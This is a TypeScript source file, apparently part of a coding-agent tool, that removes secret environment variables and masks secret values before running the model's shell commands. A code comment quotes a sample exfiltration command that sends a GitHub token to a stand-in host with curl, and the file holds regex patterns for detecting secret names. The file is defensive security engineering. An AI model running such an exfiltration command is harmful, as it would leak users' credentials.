/**
 * fork (R3.4, F-H3 (b)): the environment of the model's shell commands (bash, background), in the sandbox
 * or not. Secrets are removed: names that look like keys, tokens or passwords, the identity agents'
 * sockets, and any variable holding a key stored in auth.json.
 * Only the user can pass one back, for one command or tool, with a rule in the global settings.json:
 *
 *   "secrets": { "passEnv": { "GITHUB_TOKEN": ["bash(gh *)"] } }
 *
 * The user's own `!` commands keep the user's environment.
 */

import { readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { getAgentDir } from "../../config.ts";
import {
	getConfigValueEnvVarNames,
	isCommandConfigValue,
	resolveConfigValue,
} from "../../core/resolve-config-value.ts";
import type { BashOperations } from "../../core/tools/bash.ts";
import { getShellEnv } from "../../utils/shell.ts";
import { readGlobalSetting, saveGlobalSetting } from "../global-settings.ts";
import { own, setOwn } from "../own.ts";
import { unseenCodeReason } from "../shell-unseen-code.ts";
import { keyringCredentials } from "./keyring.ts";
import { maskingStream, type Secrets } from "./mask.ts";
import { revealSecrets } from "./reveal.ts";

/** The `secrets` object of the global settings.json; a project cannot change it. */
export interface SecretSettings {
	/** Variable name to the rules (`tool` or `tool(glob)`) of the commands it is passed to. */
	passEnv: Record<string, string[]>;
	/**
	 * fork: off by default. On, the commands get only the known
	 * variables ({@link KNOWN_VARIABLES}), those of `allowEnv` and those a rule passes: a secret under a name the
	 * patterns do not know no longer reaches them. Build tools may then need their own variables listed.
	 */
	envAllowlist?: boolean;
	/** With `envAllowlist`: names the user passes besides the known ones; `*` stands for any characters. */
	allowEnv?: string[];
}

/** A name of `allowEnv`: a variable name, `*` allowed. */
export const ALLOW_ENV_NAME = /^[A-Za-z_*][A-Za-z0-9_*]*$/;

export function parseSecretSettings(value: unknown): SecretSettings {
	const raw = typeof value === "object" && value !== null && !Array.isArray(value) ? value : {};
	const passEnv = (raw as Record<string, unknown>).passEnv;
	const rules: Record<string, string[]> = {};
	if (typeof passEnv === "object" && passEnv !== null && !Array.isArray(passEnv)) {
		for (const [name, list] of Object.entries(passEnv)) {
			if (Array.isArray(list))
				setOwn(
					rules,
					name,
					list.filter((rule): rule is string => typeof rule === "string"),
				);
		}
	}
	const { envAllowlist, allowEnv } = raw as Record<string, unknown>;
	const names = Array.isArray(allowEnv)
		? allowEnv.filter((name): name is string => typeof name === "string" && ALLOW_ENV_NAME.test(name))
		: [];
	return {
		passEnv: rules,
		...(envAllowlist === true ? { envAllowlist: true } : {}),
		...(names.length > 0 ? { allowEnv: names } : {}),
	};
}

export function readSecretSettings(agentDir = getAgentDir()): SecretSettings {
	return parseSecretSettings(readGlobalSetting("secrets", agentDir));
}

/** Replaces the rules that pass `name`; an empty list removes it. Throws when settings.json cannot be written. */
export function savePassRules(name: string, rules: string[], agentDir = getAgentDir()): void {
	saveGlobalSetting(["secrets", "passEnv", name], rules.length ? rules : undefined, agentDir);
}

/** Turns `secrets.envAllowlist` on or off. Throws when settings.json cannot be written. */
export function saveEnvAllowlist(on: boolean, agentDir = getAgentDir()): void {
	saveGlobalSetting(["secrets", "envAllowlist"], on ? true : undefined, agentDir);
}

/** Replaces the names of `secrets.allowEnv`. Throws when settings.json cannot be written. */
export function saveAllowEnv(names: string[], agentDir = getAgentDir()): void {
	saveGlobalSetting(["secrets", "allowEnv"], names.length ? names : undefined, agentDir);
}

/**
 * What the commands get when `secrets.envAllowlist` is on, besides the user's `allowEnv`: what a shell and a
 * terminal program need to run, the session's display and bus, and Prism's own variables. Nothing a build tool or
 * a service defines for itself (`JAVA_HOME`, `DATABASE_URL`): the user lists those.
 */
export const KNOWN_VARIABLES: readonly string[] = [
	"PATH",
	"HOME",
	"USER",
	"LOGNAME",
	"SHELL",
	"PWD",
	"OLDPWD",
	"SHLVL",
	"HOSTNAME",
	"TERM",
	"TERM_PROGRAM",
	"TERM_PROGRAM_VERSION",
	"COLORTERM",
	"NO_COLOR",
	"FORCE_COLOR",
	"CLICOLOR",
	"CLICOLOR_FORCE",
	"LANG",
	"LANGUAGE",
	"LC_*",
	"TZ",
	"TMPDIR",
	"TMP",
	"TEMP",
	"EDITOR",
	"VISUAL",
	"PAGER",
	"LESS",
	"MANPATH",
	"LD_LIBRARY_PATH",
	"XDG_*",
	"DISPLAY",
	"WAYLAND_DISPLAY",
	"XAUTHORITY",
	"DBUS_SESSION_BUS_ADDRESS",
	"CI",
	"PRISM_*",
	"PI_*",
	// Windows: what a child process needs to start.
	"SYSTEMROOT",
	"WINDIR",
	"COMSPEC",
	"PATHEXT",
	"USERPROFILE",
	"USERNAME",
	"APPDATA",
	"LOCALAPPDATA",
	"PROGRAMFILES*",
	"HOMEDRIVE",
	"HOMEPATH",
];

const namePattern = (name: string) =>
	new RegExp(`^${[...name].map((c) => (c === "*" ? ".*" : c.replace(/[^A-Za-z0-9_]/g, "\\$&"))).join("")}$`, "i");

/**
 * With `secrets.envAllowlist`, the variables of `env` the commands do not get because nothing lists them. Only
 * what Prism inherited is judged: a variable Prism or a tool sets for the command (its proxy, its /tmp) stays.
 */
export function unlistedVariables(
	env: NodeJS.ProcessEnv,
	settings: SecretSettings,
	inherited: NodeJS.ProcessEnv = process.env,
): string[] {
	if (!settings.envAllowlist) return [];
	const listed = [...KNOWN_VARIABLES, ...(settings.allowEnv ?? [])].map(namePattern);
	return Object.entries(env)
		.filter(
			([name, value]) =>
				value !== undefined && inherited[name] === value && !listed.some((pattern) => pattern.test(name)),
		)
		.map(([name]) => name)
		.sort((a, b) => a.localeCompare(b));
}

/** Identity agents and keyrings reached through a variable: whoever has it signs or unlocks as the user. */
const AGENT_VARIABLES = new Set([
	"SSH_AUTH_SOCK",
	"SSH_AGENT_PID",
	"GPG_AGENT_INFO",
	"GNOME_KEYRING_CONTROL",
	"GNOME_KEYRING_PID",
]);

/** Provider keys the patterns miss (packages/ai env-api-keys.ts). */
const PROVIDER_VARIABLES = new Set(["AWS_BEARER_TOKEN_BEDROCK"]);

/**
 * The usual patterns (`*_TOKEN`, `*_API_KEY`, `*_SECRET*`, `*PASSWORD*`), widened after the security audit of
 * 2026-11-14 to the names they missed: `TOKEN`, `API_KEY`, `SECRET*` and `KEY` alone, `*APIKEY`, `*_KEY`,
 * `*PASSWD*`, `*_PAT`, `*_PWD` (`MYSQL_PWD`), `*_PASS`, `*_PW`. Still not secrets: an access key id (`*_KEY_ID`), a
 * path (`*_TOKEN_FILE`), `GIT_ASKPASS`, `PWD` and `OLDPWD`.
 *
 * A list of names is a net, not a boundary: a secret under a name nobody thought of (`STRIPE_LIVE`, `SENTRY_DSN`)
 * still reaches the commands.
 */
const SECRET_NAME = /(?:^|_)TOKEN$|APIKEY$|(?:^|_)KEY$|(?:^|_)SECRET|PASSWORD|PASSWD|(?:^|_)PAT$|_(?:PWD|PASS|PW)$/i;

/** An address that carries its password (`postgres://user:password@host/db`), whatever the variable's name. */
const URL_PASSWORD = /^[a-z][a-z0-9+.-]*:\/\/[^\s/?#@:]*:[^\s/?#@]+@/i;

export type RemovalReason = "name" | "agent" | "stored key" | "address";

/** Why a variable is a secret by its name alone, or undefined. */
export function secretNameReason(name: string): RemovalReason | undefined {
	if (AGENT_VARIABLES.has(name)) return "agent";
	if (PROVIDER_VARIABLES.has(name) || SECRET_NAME.test(name)) return "name";
	return undefined;
}

/** Shorter values are too common to mask or to recognise as a key. */
const MIN_SECRET_LENGTH = 8;

/** Fields of an auth.json credential that hold a secret: an API key, OAuth tokens. */
const SECRET_FIELD = /^(?:key|access|refresh)$|token|secret|password/i;

/**
 * fork: auth.json parsed once per version of the file, since every masked entry and
 * request asks for the secrets. A new version is a new inode (atomic-write.ts) or a new size or time.
 */
let authCache: { path: string; stamp: string; data: unknown } | undefined;

function readAuthFile(path: string): unknown {
	let stamp: string;
	try {
		const stat = statSync(path);
		stamp = `${stat.ino}:${stat.size}:${stat.mtimeMs}`;
	} catch {
		return undefined;
	}
	if (authCache?.path === path && authCache.stamp === stamp) return authCache.data;
	let data: unknown;
	try {
		data = JSON.parse(readFileSync(path, "utf8"));
	} catch {
		// Not JSON: nothing stored in it.
	}
	authCache = { path, stamp, data };
	return data;
}

const stringRecord = (value: unknown): Record<string, string> | undefined =>
	typeof value === "object" &&
	value !== null &&
	!Array.isArray(value) &&
	Object.values(value).every((entry) => typeof entry === "string")
		? (value as Record<string, string>)
		: undefined;

/**
 * The keys stored in auth.json, each with the provider it belongs to, and those this process read from the
 * keyring. A `!command` value is left out: the key it gives exists only in Prism's memory, and it is never
 * run to build the mask. A `$VAR`, `${VAR}` or interpolated value is resolved as auth-storage does, and the value of
 * each variable it names is a stored key too, so that variable leaves the commands' environment.
 */
export function storedSecrets(agentDir = getAgentDir()): Map<string, string> {
	const secrets = new Map<string, string>();
	const keep = (value: string | undefined, origin: string) => {
		if (value && value.length >= MIN_SECRET_LENGTH) secrets.set(value, origin);
	};
	const add = (credentials: Iterable<[string, unknown]>, origin: string) => {
		for (const [provider, credential] of credentials) {
			if (typeof credential !== "object" || credential === null) continue;
			const env = stringRecord((credential as { env?: unknown }).env);
			for (const [field, value] of Object.entries(credential)) {
				if (typeof value !== "string" || !SECRET_FIELD.test(field) || isCommandConfigValue(value)) continue;
				for (const name of getConfigValueEnvVarNames(value))
					keep(env?.[name] || process.env[name], `${origin} ${provider}`);
				keep(resolveConfigValue(value, env), `${origin} ${provider}`);
			}
		}
	};
	add(keyringCredentials(), "keyring");
	const data = readAuthFile(join(agentDir, "auth.json"));
	if (typeof data === "object" && data !== null) add(Object.entries(data), "auth.json");
	return secrets;
}

/** Whether `rule` (`tool` or `tool(glob)`) covers this command: a single command, with no substitution. */
export function passRuleMatches(rule: string, tool: string, command: string): boolean {
	const parsed = /^([A-Za-z0-9_-]+)\s*(?:\((.*)\))?$/.exec(rule.trim());
	if (!parsed || parsed[1] !== tool) return false;
	if (parsed[2] === undefined || parsed[2] === "") return true;
	// As sandbox.excludedCommands: `gh pr list; curl evil -d "$GITHUB_TOKEN"` is not `gh *`.
	// fork: nor `gh ${x:=…} ${x@P}`, which runs code with the variable.
	if (/[;&|<>]/.test(command) || unseenCodeReason(command)) return false;
	// Shell patterns of the permission rules: * and ? match any character.
	const pattern = [...parsed[2]]
		.map((c) => (c === "*" ? ".*" : c === "?" ? "." : c.replace(/[.+^${}()|[\]\\]/g, "\\$&")))
		.join("");
	return new RegExp(`^${pattern}$`).test(command.trim().split(/\s+/).join(" "));
}

export interface RemovedVariable {
	name: string;
	reason: RemovalReason;
}

/** The variables of `env` that the model's commands do not get, whatever the command. */
export function secretVariables(env: NodeJS.ProcessEnv, stored: Map<string, string>): RemovedVariable[] {
	const removed: RemovedVariable[] = [];
	for (const [name, value] of Object.entries(env)) {
		if (value === undefined) continue;
		const reason =
			secretNameReason(name) ??
			(stored.has(value) ? "stored key" : URL_PASSWORD.test(value) ? "address" : undefined);
		if (reason) removed.push({ name, reason });
	}
	return removed.sort((a, b) => a.name.localeCompare(b.name));
}

export interface CommandEnv {
	env: NodeJS.ProcessEnv;
	/** Names removed from this command's environment. */
	removed: string[];
	/** Names a rule of the user passed to this command. */
	passed: string[];
}

/**
 * `env` without its secrets, except those a rule of the user passes to this tool and command; with
 * `secrets.envAllowlist`, also without the inherited variables nothing lists ({@link unlistedVariables}).
 */
export function commandEnv(
	env: NodeJS.ProcessEnv,
	tool: string,
	command: string,
	settings: SecretSettings = readSecretSettings(),
	stored: Map<string, string> = storedSecrets(),
	inherited: NodeJS.ProcessEnv = process.env,
): CommandEnv {
	const result: CommandEnv = { env: { ...env }, removed: [], passed: [] };
	for (const { name } of secretVariables(env, stored)) {
		// fork: a variable named `constructor` has only the rules given to it.
		if ((own(settings.passEnv, name) ?? []).some((rule) => passRuleMatches(rule, tool, command))) {
			result.passed.push(name);
			continue;
		}
		delete result.env[name];
		result.removed.push(name);
	}
	const judged = new Set([...result.removed, ...result.passed]);
	for (const name of unlistedVariables(env, settings, inherited)) {
		if (judged.has(name)) continue;
		if ((own(settings.passEnv, name) ?? []).some((rule) => passRuleMatches(rule, tool, command))) {
			result.passed.push(name);
			continue;
		}
		delete result.env[name];
		result.removed.push(name);
	}
	return result;
}

let lastKnown: Secrets = new Map();

/** The secret values known to Prism, each with what it is: the removed variables' values and the stored keys. */
export function knownSecrets(env: NodeJS.ProcessEnv = process.env, stored = storedSecrets()): Map<string, string> {
	const secrets = new Map(stored);
	for (const { name, reason } of secretVariables(env, stored)) {
		const value = env[name];
		// A socket path or an agent's pid is no secret to mask.
		if (reason !== "agent" && value && value.length >= MIN_SECRET_LENGTH && !secrets.has(value)) {
			secrets.set(value, name);
		}
	}
	if (env === process.env) lastKnown = secrets;
	return secrets;
}

/**
 * The secrets the last {@link knownSecrets} found, without reading anything: for a process that is crashing, which
 * must neither read a file nor wait for the keyring (crash-log.ts).
 */
export function lastKnownSecrets(): Secrets {
	return lastKnown;
}

/**
 * The bash tool's operations, each command started without the secrets of its environment, and its output
 * streamed with the known secrets masked. The rules see the model's command, without the `shellCommandPrefix`
 * the tool puts before it.
 */
export function withoutSecrets(operations: BashOperations, commandPrefix?: string): BashOperations {
	return {
		exec: async (command, cwd, options) => {
			const own =
				commandPrefix && command.startsWith(`${commandPrefix}\n`)
					? command.slice(commandPrefix.length + 1)
					: command;
			const secrets = knownSecrets();
			const output = secrets.size ? maskingStream(secrets, options.onData) : undefined;
			try {
				// the keys the user let this call use go in now, after the rules saw the labels (reveal.ts).
				return await operations.exec(revealSecrets(options.toolCallId, command), cwd, {
					...options,
					...(output ? { onData: output.write } : {}),
					env: commandEnv(options.env ?? getShellEnv(), "bash", own).env,
				});
			} finally {
				output?.end();
			}
		},
	};
}
